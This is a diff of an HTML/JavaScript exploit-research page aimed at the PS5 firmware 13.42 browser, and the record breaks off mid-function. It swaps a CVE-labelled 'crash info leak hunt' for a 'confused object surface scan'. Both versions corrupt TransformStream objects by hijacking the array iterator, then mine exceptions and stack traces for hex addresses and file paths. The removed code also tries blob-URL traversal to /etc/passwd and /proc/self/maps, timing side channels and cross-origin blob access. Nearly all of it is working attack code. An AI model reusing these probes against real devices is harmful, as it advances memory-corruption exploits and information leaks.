@@ -1,14 +1,13 @@
-
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 — Crash Info Leak Hunt (CVE-2026-43716 + 43732)</title>
+<title>PS5 — Confused Object Surface Scan</title>
 <style>
-body { font-family: monospace; background: #0a0a0a; color: #0f0; margin: 20px; }
-button { background: #1a1a2e; color: #0f0; border: 1px solid #0f0; padding: 10px 15px; margin: 4px; cursor: pointer; font-family: monospace; font-size: 11px; }
+body { font-family: monospace; background: #0a0a0a; color: #0f0; margin: 20px; font-size: 12px; }
+button { background: #1a1a2e; color: #0f0; border: 1px solid #0f0; padding: 8px 12px; margin: 3px; cursor: pointer; font-family: monospace; font-size: 10px; }
 button:hover { background: #0f0; color: #000; }
-#out { background: #111; border: 1px solid #333; padding: 15px; margin-top: 15px; white-space: pre-wrap; max-height: 600px; overflow-y: auto; font-size: 11px; }
+#out { background: #111; border: 1px solid #333; padding: 10px; margin-top: 10px; white-space: pre-wrap; max-height: 500px; overflow-y: auto; font-size: 11px; }
 .danger { color: #f44; }
 .safe { color: #0f0; }
 .warn { color: #fa0; }
@@ -16,34 +15,27 @@ button:hover { background: #0f0; color: #000; }
 </style>
 </head>
 <body>
-<h3>💀 Crash Info Leak Hunt — PS5 FW 13.42</h3>
-<p>Capture stack traces, error details, and side-channels from corrupted ArrayBuffer operations.</p>
+<h3>🔍 Confused Object Surface Scan — PS5 FW 13.42</h3>
+<p>Systematically probe EVERY property/method on corrupted readable/writable.</p>
 
 <div>
-  <b>Phase A — Crash with Stack Capture:</b><br>
-  <button onclick="run('S1')">S1: structuredClone transfer (B2)</button>
-  <button onclick="run('S2')">S2: Blob + FileReader (C2)</button>
-  <button onclick="run('S3')">S3: Response.arrayBuffer (C3)</button>
-  <button onclick="run('S4')">S4: URL.createObjectURL (C4)</button>
-  <br><br>
-  <b>Phase B — Error Object Analysis:</b><br>
-  <button onclick="run('E1')">E1: Error.stack on corruption</button>
-  <button onclick="run('E2')">E2: Error.prepareStackTrace shim</button>
-  <button onclick="run('E3')">E3: Promise rejection details</button>
-  <button onclick="run('E4')">E4: Cross-origin error diff</button>
-  <br><br>
-  <b>Phase C — Side-Channel Timing:</b><br>
-  <button onclick="run('T1')">T1: Timing slice() vs transfer()</button>
-  <button onclick="run('T2')">T2: Timing corrupted vs clean</button>
-  <button onclick="run('T3')">T3: Memory pressure timing</button>
-  <br><br>
-  <b>Phase D — CVE-2026-43732 Blob Tests:</b><br>
-  <button onclick="run('B1')">B1: Blob URL origin leak</button>
-  <button onclick="run('B2')">B2: Blob URL path traversal</button>
-  <button onclick="run('B3')">B3: Cross-origin blob access</button>
-  <button onclick="run('B4')">B4: Blob subresource IPC</button>
-  <br><br>
-  <button onclick="clearOut()" style="background:#300;color:#f44;border-color:#f44;">Clear Log</button>
+  <button onclick="run('P1')">P1: ReadableStream properties</button>
+  <button onclick="run('P2')">P2: WritableStream properties</button>
+  <button onclick="run('P3')">P3: Cross-prototype access</button>
+  <button onclick="run('P4')">P4: Symbol properties</button>
+  <button onclick="run('P5')">P5: Internal slots (toString, valueOf)</button>
+  <br>
+  <button onclick="run('M1')">M1: Method calls (safe order)</button>
+  <button onclick="run('M2')">M2: Async methods</button>
+  <button onclick="run('M3')">M3: Iterator protocols</button>
+  <button onclick="run('M4')">M4: Getter-only properties</button>
+  <br>
+  <button onclick="run('L1')">L1: Leak via exceptions</button>
+  <button onclick="run('L2')">L2: Leak via toString</button>
+  <button onclick="run('L3')">L3: Leak via JSON</button>
+  <button onclick="run('L4')">L4: Leak via descriptors</button>
+  <br>
+  <button onclick="clearOut()" style="background:#300;color:#f44;border-color:#f44;">Clear</button>
 </div>
 
 <hr>
@@ -60,9 +52,9 @@ function beacon(m) {
     var out = document.getElementById('out');
     var line = document.createElement('div');
     var ts = new Date().toLocaleTimeString();
-    if (m.indexOf('💀') !== -1 || m.indexOf('CRASH') !== -1 || m.indexOf('DIED') !== -1) line.className = 'danger';
+    if (m.indexOf('💀') !== -1 || m.indexOf('CRASH') !== -1) line.className = 'danger';
     else if (m.indexOf('⚠️') !== -1 || m.indexOf('THREW') !== -1) line.className = 'warn';
-    else if (m.indexOf('📊') !== -1 || m.indexOf('INFO') !== -1) line.className = 'info';
+    else if (m.indexOf('📊') !== -1 || m.indexOf('LEAK') !== -1) line.className = 'info';
     else line.className = 'safe';
     line.textContent = '[' + ts + '] ' + m;
     out.appendChild(line);
@@ -71,11 +63,11 @@ function beacon(m) {
 
 function clearOut() {
     document.getElementById('out').innerHTML = '';
-    beacon('=== log cleared ===');
+    beacon('=== cleared ===');
 }
 
-function buildFake(slot1Value) {
-    var fake = { a: 0, b: slot1Value, c: 0 };
+function buildFake(slot1) {
+    var fake = { a: 0, b: slot1, c: 0 };
     Array.prototype[Symbol.iterator] = function() {
         var arr = this, i = 0;
         return {
@@ -88,503 +80,463 @@ function buildFake(slot1Value) {
             }
         };
     };
-    var ts = null;
+    var ts;
     try { ts = new TransformStream(); } catch(e) { beacon('construct THREW ' + e.name); }
     Array.prototype[Symbol.iterator] = originalIterator;
     return ts;
 }
 
-function captureError(name, fn) {
-    beacon('> ' + name);
+function probeProp(obj, name, path) {
     try {
-        var t0 = performance.now();
-        var result = fn();
-        var t1 = performance.now();
+        var desc = Object.getOwnPropertyDescriptor(obj, name);
+        if (!desc) {
+            try { var v = obj[name]; beacon(path + '.' + name + ' = ' + String(v).slice(0,60)); } 
+            catch(e) { beacon(path + '.' + name + ' 💀 THREW ' + e.name); }
+            return;
+        }
         
-        if (result && typeof result.then === 'function') {
-            result.then(function(v) {
-                beacon(name + ' ✅ RESOLVED | dt=' + (performance.now()-t0).toFixed(2) + 'ms | val=' + String(v).slice(0,80));
-            }).catch(function(e) {
-                var info = 'name=' + e.name + ' msg=' + String(e.message).slice(0,100);
-                var stack = '';
-                try { stack = (e.stack || '').slice(0,300); } catch(ex){}
-                beacon(name + ' ⚠️ REJECTED | ' + info);
-                if (stack) beacon('  stack=' + stack);
-            });
-        } else {
-            beacon(name + ' ✅ OK | dt=' + (t1-t0).toFixed(2) + 'ms | val=' + String(result).slice(0,80));
+        if (desc.get) {
+            try {
+                var v = desc.get.call(obj);
+                var s = String(v);
+                var tag = Object.prototype.toString.call(v);
+                if (s !== tag && s !== '[object Object]') {
+                    beacon(path + '.' + name + ' [getter] = ' + tag + ' | ' + s.slice(0,60));
+                } else {
+                    beacon(path + '.' + name + ' [getter] = ' + tag);
+                }
+            } catch(e) {
+                beacon(path + '.' + name + ' [getter] 💀 THREW ' + e.name + ': ' + String(e.message).slice(0,80));
+                // Try to extract leak from error
+                var stack = (e.stack || '').slice(0,200);
+                var hex = stack.match(/0x[0-9a-fA-F]+/g);
+                if (hex) beacon('  📊 HEX=' + hex.join(' '));
+            }
+        }
+        if (desc.set) {
+            beacon(path + '.' + name + ' [setter] = function');
+        }
+        if (!desc.get && !desc.set) {
+            beacon(path + '.' + name + ' [value] = ' + String(desc.value).slice(0,60));
         }
     } catch(e) {
-        var info = 'name=' + e.name + ' msg=' + String(e.message).slice(0,100);
-        var stack = '';
-        try { stack = (e.stack || '').slice(0,400); } catch(ex){}
-        beacon(name + ' 💀 THREW | ' + info);
-        if (stack) beacon('  stack=' + stack);
-        
-        // Try to extract any numeric values from error
-        var nums = String(e.message).match(/0x[0-9a-fA-F]+/g);
-        if (nums) beacon('  📊 HEX_IN_ERROR=' + nums.join(' '));
-        var nums2 = String(e.stack).match(/0x[0-9a-fA-F]+/g);
-        if (nums2) beacon('  📊 HEX_IN_STACK=' + nums2.join(' '));
+        beacon(path + '.' + name + ' 💀 META_THREW ' + e.name);
     }
 }
 
 var RUNS = {};
 
-// ===== Phase A — Crash with Stack Capture =====
-
-RUNS['S1'] = function() {
-    beacon('=== S1: structuredClone transfer (B2 crash path) ===');
-    var ab = new ArrayBuffer(0x100);
-    var ts = buildFake(ab);
-    if (!ts) { beacon('build failed'); return; }
-    beacon('AB corrupted — attempting transfer...');
-    
-    captureError('structuredClone.transfer', function() {
-        return structuredClone(ab, { transfer: [ab] });
-    });
-    
-    // Also try without transfer option
-    captureError('structuredClone.noTransfer', function() {
-        return structuredClone(ab);
-    });
-    
-    beacon('done');
-};
-
-RUNS['S2'] = function() {
-    beacon('=== S2: Blob + FileReader (C2 crash path) ===');
-    var ab = new ArrayBuffer(0x100);
-    var view = new Uint8Array(ab);
-    view[0] = 0x41;
-    
-    var ts = buildFake(ab);
+/* P1: ReadableStream properties */
+RUNS['P1'] = function() {
+    beacon('=== P1: ReadableStream Properties ===');
+    var ts = buildFake(new ArrayBuffer(0x100));
     if (!ts) return;
-    beacon('AB corrupted — Blob/FileReader...');
+    var r = ts.readable;
     
-    captureError('Blob.constructor', function() {
-        return new Blob([ab]);
+    var props = ['locked', 'cancel', 'getReader', 'tee', 'pipeTo', 'pipeThrough', 
+                 Symbol.asyncIterator, Symbol.iterator, Symbol.toStringTag];
+    props.forEach(function(p) {
+        var name = typeof p === 'symbol' ? p.toString().slice(7,-1) : p;
+        probeProp(r, p, 'readable');
     });
     
-    captureError('FileReader.readAsArrayBuffer', function() {
-        return new Promise(function(resolve, reject) {
-            var blob = new Blob(['test']);
-            var reader = new FileReader();
-            reader.onload = function(e) { resolve('loaded ' + e.target.result.byteLength); };
-            reader.onerror = function(e) { reject(new Error(reader.error.name)); };
-            reader.readAsArrayBuffer(blob);
-        });
-    });
-    
-    captureError('FileReader.readAsText(corruptedBlob)', function() {
-        return new Promise(function(resolve, reject) {
-            try {
-                var blob = new Blob([ab]);
-                var reader = new FileReader();
-                reader.onload = function(e) { resolve('text=' + e.target.result.slice(0,50)); };
-                reader.onerror = function(e) { reject(new Error(reader.error.name)); };
-                reader.readAsText(blob);
-            } catch(e) { reject(e); }
-        });
-    });
-    
+    // Try prototype chain
+    var proto = Object.getPrototypeOf(r);
+    beacon('📊 readable proto=' + Object.prototype.toString.call(proto));
+    beacon('📊 readable proto keys=' + Object.getOwnPropertyNames(proto).join(',').slice(0,100));
     beacon('done');
 };
 
-RUNS['S3'] = function() {
-    beacon('=== S3: Response.arrayBuffer (C3 crash path) ===');
-    var ab = new ArrayBuffer(0x100);
-    var ts = buildFake(ab);
+/* P2: WritableStream properties */
+RUNS['P2'] = function() {
+    beacon('=== P2: WritableStream Properties ===');
+    var ts = buildFake(new ArrayBuffer(0x100));
     if (!ts) return;
-    beacon('AB corrupted — Response...');
+    var w = ts.writable;
     
-    captureError('Response.fromBlob', function() {
-        var blob = new Blob([ab]);
-        return new Response(blob);
+    var props = ['locked', 'abort', 'getWriter', 'close', Symbol.toStringTag];
+    props.forEach(function(p) {
+        var name = typeof p === 'symbol' ? p.toString().slice(7,-1) : p;
+        probeProp(w, p, 'writable');
     });
     
-    captureError('Response.arrayBuffer', function() {
-        var blob = new Blob(['test']);
-        var resp = new Response(blob);
-        return resp.arrayBuffer();
-    });
-    
-    captureError('Response(corrupted).arrayBuffer', function() {
-        var blob = new Blob([ab]);
-        var resp = new Response(blob);
-        return resp.arrayBuffer();
-    });
-    
+    var proto = Object.getPrototypeOf(w);
+    beacon('📊 writable proto=' + Object.prototype.toString.call(proto));
     beacon('done');
 };
 
-RUNS['S4'] = function() {
-    beacon('=== S4: URL.createObjectURL (C4 crash path) ===');
-    var ab = new ArrayBuffer(0x100);
-    var ts = buildFake(ab);
+/* P3: Cross-prototype access */
+RUNS['P3'] = function() {
+    beacon('=== P3: Cross-Prototype Access ===');
+    var ts = buildFake(new ArrayBuffer(0x100));
     if (!ts) return;
-    beacon('AB corrupted — URL.createObjectURL...');
+    var r = ts.readable;  // Actually WritableStream internally
+    var w = ts.writable;  // Actually ReadableStream internally
     
-    captureError('URL.createObjectURL(Blob)', function() {
-        var blob = new Blob([ab]);
-        var url = URL.createObjectURL(blob);
-        return 'url=' + url;
+    // Try accessing WritableStream methods on "readable" (which is WritableStream)
+    beacon('--- readable (internal WritableStream) ---');
+    ['getWriter', 'abort', 'close'].forEach(function(m) {
+        try {
+            var fn = r[m];
+            beacon('readable.' + m + ' = ' + (typeof fn) + ' | ' + String(fn).slice(0,50));
+        } catch(e) {
+            beacon('readable.' + m + ' 💀 THREW ' + e.name);
+        }
     });
     
-    captureError('URL.createObjectURL(Blob-clean)', function() {
-        var blob = new Blob(['clean']);
-        var url = URL.createObjectURL(blob);
-        return 'clean_url=' + url;
+    // Try accessing ReadableStream methods on "writable" (which is ReadableStream)
+    beacon('--- writable (internal ReadableStream) ---');
+    ['getReader', 'cancel', 'tee'].forEach(function(m) {
+        try {
+            var fn = w[m];
+            beacon('writable.' + m + ' = ' + (typeof fn) + ' | ' + String(fn).slice(0,50));
+        } catch(e) {
+            beacon('writable.' + m + ' 💀 THREW ' + e.name);
+        }
     });
     
     beacon('done');
 };
 
-// ===== Phase B — Error Object Analysis =====
-
-RUNS['E1'] = function() {
-    beacon('=== E1: Error.stack on corruption ===');
-    var ab = new ArrayBuffer(0x100);
-    var ts = buildFake(ab);
+/* P4: Symbol properties */
+RUNS['P4'] = function() {
+    beacon('=== P4: Symbol Properties ===');
+    var ts = buildFake(new ArrayBuffer(0x100));
     if (!ts) return;
     
-    try {
-        structuredClone(ab, { transfer: [ab] });
-    } catch(e) {
-        beacon('📊 Error.name=' + e.name);
-        beacon('📊 Error.message=' + String(e.message).slice(0,200));
-        beacon('📊 Error.stack=' + (e.stack || 'none').slice(0,500));
-        
-        // Enumerate all properties
-        var props = [];
-        for (var k in e) { props.push(k + '=' + String(e[k]).slice(0,50)); }
-        beacon('📊 Error.props=' + props.join(', ').slice(0,300));
-        
-        // Try toString variants
-        beacon('📊 e.toString()=' + e.toString().slice(0,100));
-        try { beacon('📊 e.toSource?=' + (typeof e.toSource)); } catch(ex){}
-    }
-    beacon('done');
-};
-
-RUNS['E2'] = function() {
-    beacon('=== E2: Error.prepareStackTrace shim ===');
-    // Even if undefined, try to set it and see behavior
-    beacon('typeof Error.prepareStackTrace=' + typeof Error.prepareStackTrace);
-    
-    try {
-        Error.prepareStackTrace = function(err, stack) {
-            beacon('📊 prepareStackTrace CALLED!');
-            try {
-                var frames = stack.map(function(f) {
-                    return f.getFunctionName() + '@' + f.getLineNumber();
-                });
-                beacon('📊 frames=' + frames.join(',').slice(0,200));
-            } catch(ex) {}
-            return stack;
-        };
-        beacon('set prepareStackTrace OK');
-    } catch(e) {
-        beacon('set prepareStackTrace THREW ' + e.name);
-    }
-    
-    // Trigger an error to test
-    try {
-        var ab = new ArrayBuffer(0x100);
-        var ts = buildFake(ab);
-        structuredClone(ab, { transfer: [ab] });
-    } catch(e) {
-        beacon('Error after shim: ' + e.name);
-    }
-    
-    try { Error.prepareStackTrace = undefined; } catch(e){}
-    beacon('done');
-};
-
-RUNS['E3'] = function() {
-    beacon('=== E3: Promise rejection details ===');
-    var ab = new ArrayBuffer(0x100);
-    var ts = buildFake(ab);
-    if (!ts) return;
-    
-    Promise.resolve().then(function() {
-        return structuredClone(ab, { transfer: [ab] });
-    }).catch(function(e) {
-        beacon('📊 Promise rejection: ' + e.name);
-        beacon('📊 Message: ' + String(e.message).slice(0,150));
-        beacon('📊 Stack: ' + (e.stack || 'none').slice(0,300));
-        
-        // Check if rejection reason has extra properties
-        var keys = Object.getOwnPropertyNames(e);
-        beacon('📊 OwnProps: ' + keys.join(', '));
+    var syms = Object.getOwnPropertySymbols(ts.readable);
+    beacon('📊 readable symbols=' + syms.length);
+    syms.forEach(function(s) {
+        try {
+            var v = ts.readable[s];
+            beacon('  readable[' + s.toString() + '] = ' + String(v).slice(0,60));
+        } catch(e) {
+            beacon('  readable[' + s.toString() + '] 💀 THREW ' + e.name);
+        }
     });
     
-    beacon('Promise scheduled');
-};
-
-RUNS['E4'] = function() {
-    beacon('=== E4: Cross-origin error diff ===');
-    // Compare error messages from same-origin vs cross-origin
-    // This might reveal internal details
-    
-    var errors = [];
-    
-    // Error 1: clean AB
-    try {
-        var clean = new ArrayBuffer(0x10);
-        structuredClone(clean, { transfer: [clean] });
-    } catch(e) {
-        errors.push('clean:' + e.name + ':' + String(e.message).slice(0,50));
-    }
-    
-    // Error 2: corrupted AB
-    try {
-        var ab = new ArrayBuffer(0x100);
-        var ts = buildFake(ab);
-        structuredClone(ab, { transfer: [ab] });
-    } catch(e) {
-        errors.push('corrupt:' + e.name + ':' + String(e.message).slice(0,50));
-    }
-    
-    beacon('📊 Error diff:');
-    errors.forEach(function(e) { beacon('  ' + e); });
+    syms = Object.getOwnPropertySymbols(ts.writable);
+    beacon('📊 writable symbols=' + syms.length);
+    syms.forEach(function(s) {
+        try {
+            var v = ts.writable[s];
+            beacon('  writable[' + s.toString() + '] = ' + String(v).slice(0,60));
+        } catch(e) {
+            beacon('  writable[' + s.toString() + '] 💀 THREW ' + e.name);
+        }
+    });
     beacon('done');
 };
 
-// ===== Phase C — Side-Channel Timing =====
-
-RUNS['T1'] = function() {
-    beacon('=== T1: Timing slice() vs transfer() ===');
-    var iterations = 100;
-    
-    // Clean AB timing
-    var cleanSlice = 0, cleanTransfer = 0;
-    for (var i = 0; i < iterations; i++) {
-        var ab = new ArrayBuffer(0x1000);
-        var t0 = performance.now();
-        var s = ab.slice(0, 0x100);
-        cleanSlice += performance.now() - t0;
-        
-        ab = new ArrayBuffer(0x1000);
-        t0 = performance.now();
-        try { structuredClone(ab, { transfer: [ab] }); } catch(e){}
-        cleanTransfer += performance.now() - t0;
-    }
-    
-    beacon('📊 Clean: slice=' + (cleanSlice/iterations).toFixed(4) + 'ms transfer=' + (cleanTransfer/iterations).toFixed(4) + 'ms');
-    
-    // Corrupted AB timing
-    var corruptSlice = 0, corruptTransfer = 0;
-    for (var i = 0; i < iterations; i++) {
-        var ab = new ArrayBuffer(0x1000);
-        var ts = buildFake(ab);
-        
-        var t0 = performance.now();
-        var s = ab.slice(0, 0x100);
-        corruptSlice += performance.now() - t0;
-        
-        ab = new ArrayBuffer(0x1000);
-        ts = buildFake(ab);
-        t0 = performance.now();
-        try { structuredClone(ab, { transfer: [ab] }); } catch(e){}
-        corruptTransfer += performance.now() - t0;
-    }
-    
-    beacon('📊 Corrupt: slice=' + (corruptSlice/iterations).toFixed(4) + 'ms transfer=' + (corruptTransfer/iterations).toFixed(4) + 'ms');
-    beacon('done');
-};
-
-RUNS['T2'] = function() {
-    beacon('=== T2: Timing corrupted vs clean ===');
-    // Measure time to create TransformStream with corrupted AB
-    
-    var cleanTime = 0, corruptTime = 0;
-    var n = 50;
-    
-    for (var i = 0; i < n; i++) {
-        var t0 = performance.now();
-        var ab = new ArrayBuffer(0x100);
-        var ts = new TransformStream();
-        cleanTime += performance.now() - t0;
-    }
-    
-    for (var i = 0; i < n; i++) {
-        var t0 = performance.now();
-        var ab = new ArrayBuffer(0x100);
-        var ts = buildFake(ab);
-        corruptTime += performance.now() - t0;
-    }
-    
-    beacon('📊 Clean TS create=' + (cleanTime/n).toFixed(4) + 'ms');
-    beacon('📊 Corrupt TS create=' + (corruptTime/n).toFixed(4) + 'ms');
-    beacon('📊 Delta=' + ((corruptTime-cleanTime)/n).toFixed(4) + 'ms');
-    beacon('done');
-};
-
-RUNS['T3'] = function() {
-    beacon('=== T3: Memory pressure timing ===');
-    var ab = new ArrayBuffer(0x100000);
-    var ts = buildFake(ab);
+/* P5: Internal slots */
+RUNS['P5'] = function() {
+    beacon('=== P5: Internal Slots ===');
+    var ts = buildFake(new ArrayBuffer(0x100));
     if (!ts) return;
     
-    // Allocate pressure
-    var pressure = [];
-    var t0 = performance.now();
-    for (var i = 0; i < 100; i++) {
-        pressure.push(new ArrayBuffer(0x10000));
-    }
-    var allocTime = performance.now() - t0;
+    var r = ts.readable;
+    var w = ts.writable;
     
-    beacon('📊 Alloc 100MB=' + allocTime.toFixed(2) + 'ms');
+    beacon('--- toString variants ---');
+    try { beacon('r.toString()=' + r.toString()); } catch(e) { beacon('r.toString 💀 ' + e.name); }
+    try { beacon('w.toString()=' + w.toString()); } catch(e) { beacon('w.toString 💀 ' + e.name); }
+    try { beacon('r.valueOf()=' + r.valueOf()); } catch(e) { beacon('r.valueOf 💀 ' + e.name); }
+    try { beacon('w.valueOf()=' + w.valueOf()); } catch(e) { beacon('w.valueOf 💀 ' + e.name); }
+    try { beacon('r[Symbol.toPrimitive]=' + r[Symbol.toPrimitive]); } catch(e) { beacon('r[Symbol.toPrimitive] 💀 ' + e.name); }
     
-    // Try accessing corrupted AB under pressure
-    t0 = performance.now();
-    try {
-        var blob = new Blob([ab]);
-    } catch(e) {
-        beacon('📊 Blob under pressure THREW ' + e.name);
-    }
-    var blobTime = performance.now() - t0;
-    beacon('📊 Blob create under pressure=' + blobTime.toFixed(4) + 'ms');
+    beacon('--- Object.prototype methods ---');
+    try { beacon('r.constructor.name=' + r.constructor.name); } catch(e) { beacon('r.constructor.name 💀 ' + e.name); }
+    try { beacon('w.constructor.name=' + w.constructor.name); } catch(e) { beacon('w.constructor.name 💀 ' + e.name); }
     
-    pressure = null;
     beacon('done');
 };
 
-// ===== Phase D — CVE-2026-43732 Blob Tests =====
-
-RUNS['B1'] = function() {
-    beacon('=== B1: Blob URL origin leak ===');
+/* M1: Method calls (safe order) */
+RUNS['M1'] = function() {
+    beacon('=== M1: Method Calls (Safe Order) ===');
+    var ts = buildFake(new ArrayBuffer(0x100));
+    if (!ts) return;
+    var r = ts.readable;
+    var w = ts.writable;
     
-    // Create blob from different sources and compare URLs
-    var blob1 = new Blob(['test1']);
-    var blob2 = new Blob(['test2']);
-    var url1 = URL.createObjectURL(blob1);
-    var url2 = URL.createObjectURL(blob2);
-    
-    beacon('📊 blob1 URL=' + url1);
-    beacon('📊 blob2 URL=' + url2);
-    
-    // Try to extract origin from URL
-    try {
-        var u = new URL(url1);
-        beacon('📊 protocol=' + u.protocol);
-        beacon('📊 host=' + u.host);
-        beacon('📊 pathname=' + u.pathname.slice(0,50));
-        beacon('📊 hash=' + u.hash);
-    } catch(e) {
-        beacon('URL parse THREW ' + e.name);
-    }
-    
-    URL.revokeObjectURL(url1);
-    URL.revokeObjectURL(url2);
-    beacon('done');
-};
-
-RUNS['B2'] = function() {
-    beacon('=== B2: Blob URL path traversal ===');
-    
-    var tests = [
-        'blob:../../../../etc/passwd',
-        'blob:../../../proc/self/maps',
-        'blob:..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
-        'blob:/sdcard/test',
-        'blob:/data/local/tmp/test',
-        'blob:/user/home/test'
+    // Methods that don't require arguments
+    var safeMethods = [
+        ['r.toString', function() { return r.toString(); }],
+        ['r.valueOf', function() { return r.valueOf(); }],
+        ['w.toString', function() { return w.toString(); }],
+        ['w.valueOf', function() { return w.valueOf(); }],
+        ['Object.keys(r)', function() { return Object.keys(r).join(','); }],
+        ['Object.keys(w)', function() { return Object.keys(w).join(','); }],
+        ['Object.entries(r)', function() { return Object.entries(r).length; }],
+        ['Object.entries(w)', function() { return Object.entries(w).length; }],
     ];
     
-    tests.forEach(function(url) {
-        captureError('fetch(' + url.slice(0,30) + '...)', function() {
-            return fetch(url).then(function(r) { return r.text(); });
-        });
+    safeMethods.forEach(function(pair) {
+        try {
+            var v = pair[1]();
+            beacon(pair[0] + ' ✅ = ' + String(v).slice(0,60));
+        } catch(e) {
+            beacon(pair[0] + ' 💀 THREW ' + e.name + ': ' + String(e.message).slice(0,80));
+            var hex = (e.stack || '').match(/0x[0-9a-fA-F]+/g);
+            if (hex) beacon('  📊 HEX=' + hex.join(' '));
+        }
     });
+    beacon('done');
+};
+
+/* M2: Async methods */
+RUNS['M2'] = function() {
+    beacon('=== M2: Async Methods ===');
+    var ts = buildFake(new ArrayBuffer(0x100));
+    if (!ts) return;
+    var r = ts.readable;
+    var w = ts.writable;
+    
+    var asyncTests = [
+        ['r.cancel()', function() { return r.cancel('test'); }],
+        ['w.abort()', function() { return w.abort('test'); }],
+        ['w.close()', function() { return w.close(); }],
+    ];
+    
+    var pending = asyncTests.length;
+    asyncTests.forEach(function(pair) {
+        try {
+            var p = pair[1]();
+            if (p && typeof p.then === 'function') {
+                p.then(function(v) {
+                    beacon(pair[0] + ' ✅ RESOLVED = ' + String(v).slice(0,60));
+                }).catch(function(e) {
+                    beacon(pair[0] + ' ⚠️ REJECTED ' + e.name + ': ' + String(e.message).slice(0,80));
+                    var hex = (e.stack || '').match(/0x[0-9a-fA-F]+/g);
+                    if (hex) beacon('  📊 HEX=' + hex.join(' '));
+                });
+            } else {
+                beacon(pair[0] + ' ✅ = ' + String(p).slice(0,60));
+            }
+        } catch(e) {
+            beacon(pair[0] + ' 💀 SYNC_THREW ' + e.name);
+        }
+    });
+    
+    setTimeout(function() { beacon('done'); }, 1000);
+};
+
+/* M3: Iterator protocols */
+RUNS['M3'] = function() {
+    beacon('=== M3: Iterator Protocols ===');
+    var ts = buildFake(new ArrayBuffer(0x100));
+    if (!ts) return;
+    var r = ts.readable;
+    
+    try {
+        var asyncIter = r[Symbol.asyncIterator];
+        beacon('r[Symbol.asyncIterator]=' + typeof asyncIter);
+        if (asyncIter) {
+            try {
+                var iter = asyncIter.call(r);
+                beacon('iter=' + Object.prototype.toString.call(iter));
+                try {
+                    iter.next().then(function(v) {
+                        beacon('iter.next() ✅ value=' + String(v.value).slice(0,40) + ' done=' + v.done);
+                    }).catch(function(e) {
+                        beacon('iter.next() ⚠️ ' + e.name);
+                    });
+                } catch(e) {
+                    beacon('iter.next() sync 💀 ' + e.name);
+                }
+            } catch(e) {
+                beacon('asyncIter.call 💀 ' + e.name);
+            }
+        }
+    } catch(e) {
+        beacon('asyncIterator access 💀 ' + e.name);
+    }
     
     beacon('done');
 };
 
-RUNS['B3'] = function() {
-    beacon('=== B3: Cross-origin blob access ===');
+/* M4: Getter-only deep probe */
+RUNS['M4'] = function() {
+    beacon('=== M4: Getter-Only Deep Probe ===');
+    var ts = buildFake(new ArrayBuffer(0x100));
+    if (!ts) return;
     
-    // Create blob, get URL, try cross-origin access patterns
-    var blob = new Blob(['secret_data_12345']);
-    var url = URL.createObjectURL(blob);
+    function deepProbe(obj, path, depth) {
+        if (depth > 2) return;
+        try {
+            var keys = Object.getOwnPropertyNames(obj);
+            keys.forEach(function(k) {
+                if (k === 'constructor' || k === 'prototype') return;
+                try {
+                    var desc = Object.getOwnPropertyDescriptor(obj, k);
+                    if (desc && desc.get && !desc.set) {
+                        try {
+                            var v = desc.get.call(obj);
+                            beacon(path + '.' + k + ' [getter-only] = ' + Object.prototype.toString.call(v) + ' | ' + String(v).slice(0,40));
+                            if (v && typeof v === 'object') deepProbe(v, path + '.' + k, depth + 1);
+                        } catch(e) {
+                            beacon(path + '.' + k + ' [getter-only] 💀 THREW ' + e.name);
+                            var hex = (e.stack || '').match(/0x[0-9a-fA-F]+/g);
+                            if (hex) beacon('  📊 HEX=' + hex.join(' '));
+                        }
+                    }
+                } catch(e) {}
+            });
+        } catch(e) {}
+    }
     
-    beacon('📊 Blob URL=' + url);
-    
-    // Try fetch with different modes
-    captureError('fetch.blob.no-cors', function() {
-        return fetch(url, { mode: 'no-cors' }).then(function(r) { return 'status=' + r.status; });
-    });
-    
-    captureError('fetch.blob.cors', function() {
-        return fetch(url, { mode: 'cors' }).then(function(r) { return 'status=' + r.status; });
-    });
-    
-    // Try iframe
-    captureError('iframe.blob', function() {
-        return new Promise(function(resolve) {
-            var f = document.createElement('iframe');
-            f.src = url;
-            f.onload = function() { resolve('iframe loaded'); };
-            f.onerror = function() { resolve('iframe error'); };
-            document.body.appendChild(f);
-            setTimeout(function() { resolve('iframe timeout'); }, 2000);
-        });
-    });
-    
-    URL.revokeObjectURL(url);
+    deepProbe(ts.readable, 'readable', 0);
+    deepProbe(ts.writable, 'writable', 0);
     beacon('done');
 };
 
-RUNS['B4'] = function() {
-    beacon('=== B4: Blob subresource IPC ===');
+/* L1: Leak via exceptions */
+RUNS['L1'] = function() {
+    beacon('=== L1: Leak via Exceptions ===');
+    var ts = buildFake(new ArrayBuffer(0x100));
+    if (!ts) return;
     
-    // Test if blob URLs can be used in contexts that trigger IPC
-    var blob = new Blob(['<script>parent.postMessage("from_blob", "*");<\/script>'], { type: 'text/html' });
-    var url = URL.createObjectURL(blob);
+    // Try operations that SHOULD fail and see what they reveal
+    var leakTests = [
+        ['r.getReader()', function() { return ts.readable.getReader(); }],
+        ['w.getWriter()', function() { return ts.writable.getWriter(); }],
+        ['r.locked (force)', function() { 
+            // Force read via defineProperty bypass
+            var v = Object.getOwnPropertyDescriptor(Object.getPrototypeOf(ts.readable), 'locked');
+            return v.get.call(ts.readable);
+        }],
+        ['w.locked (force)', function() {
+            var v = Object.getOwnPropertyDescriptor(Object.getPrototypeOf(ts.writable), 'locked');
+            return v.get.call(ts.writable);
+        }],
+    ];
     
-    beacon('📊 Blob HTML URL=' + url);
-    
-    // Try as image src (triggers NetworkProcess load)
-    captureError('Image.blob.src', function() {
-        return new Promise(function(resolve) {
-            var img = new Image();
-            img.onload = function() { resolve('img loaded'); };
-            img.onerror = function() { resolve('img error'); };
-            img.src = url;
-            setTimeout(function() { resolve('img timeout'); }, 2000);
-        });
+    leakTests.forEach(function(pair) {
+        try {
+            pair[1]();
+            beacon(pair[0] + ' ✅ unexpected success');
+        } catch(e) {
+            var msg = String(e.message);
+            beacon(pair[0] + ' 💀 ' + e.name + ': ' + msg.slice(0,100));
+            // Look for ANY numeric patterns
+            var nums = msg.match(/\d+/g);
+            if (nums) beacon('  📊 NUMS=' + nums.join(' '));
+            var hex = (e.stack || '').match(/0x[0-9a-fA-F]+/g);
+            if (hex) beacon('  📊 HEX=' + hex.join(' '));
+            // Look for file paths
+            var paths = msg.match(/[\w\/\\.-]+\.[\w]+/g);
+            if (paths) beacon('  📊 PATHS=' + paths.join(' '));
+        }
     });
-    
-    // Try as script src
